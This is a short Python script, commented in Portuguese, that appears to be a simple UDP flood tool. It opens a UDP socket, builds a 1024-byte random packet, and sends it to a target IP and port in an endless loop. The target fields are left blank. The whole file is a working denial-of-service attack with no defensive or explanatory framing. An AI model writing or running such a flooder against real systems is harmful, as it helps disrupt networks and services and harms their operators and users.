import socket 
import random



dest_ip = ''
dest_port = ''


sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

packet = random._urandom(1024)  # GERA PACOTES ALEÁTORIOS DE REDE




while True:
    sock.sendto(packet, (dest_ip, dest_port))    # VAI ENVIAR PACOTES ALEATORIOS PARA O IP DE DESTINO